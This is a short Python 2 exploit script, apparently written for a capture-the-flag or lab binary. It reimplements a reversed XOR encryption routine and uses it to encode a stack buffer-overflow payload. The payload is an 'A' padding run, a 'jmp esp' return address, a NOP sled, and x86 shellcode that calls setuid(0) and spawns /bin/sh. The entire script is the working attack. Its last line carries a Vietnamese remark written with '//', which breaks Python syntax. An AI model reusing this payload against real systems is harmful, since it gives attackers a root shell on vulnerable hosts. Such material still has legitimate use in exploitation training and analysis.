import struct
def xcrypt(content, length):

    encrypted = ''

    # set the base encryption key. this mutates with each pass
    key = 0xea1ab19f    # var_C = 0xea1ab19f;

    for word in range(length >> 2): # while (arg_4 >> 0x2 > var_4) {
        # apply the encryption logic as can bee seen in
        # *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;

        # grab the 4 bytes we working with
        bytes = content[word*4:((word*4)+4)]

        # struct unpack_from returns a tuple, we want 0 so that
        # we end up with something we can xor
        long_to_xor = struct.unpack_from('<L', bytes)[0]

        # apply the xor, this is the actual encryption part
        encrypted_bytes = long_to_xor ^ key

        # append the 4 encrypted bytes by packing them
        encrypted += struct.pack('<L',encrypted_bytes)

        # next we run the key mutation
        for mutation in xrange(8):

            # no mutation is possible of the key is 1111 1111 1111 1111
            if (key & 1) != 0:
                key = key >> 1
                key = key ^ 0x6daa1cf4
            else:
                key = key >> 1

    return encrypted;

if __name__ == '__main__':

    # 08048e93  ; jmp esp
    shellcode = (
        "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68" +
        "\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
    )

    content = "A" *4124 + "\x93\x8e\x04\x08" + "\x90"*16 + shellcode + "C" *(6000-4124-4-16-len(shellcode))
    length = len(content)

    encrypted = xcrypt(content, length)
    print encrypted // dùng cho python2, python3 hiện lỗi kệ mẹ nó 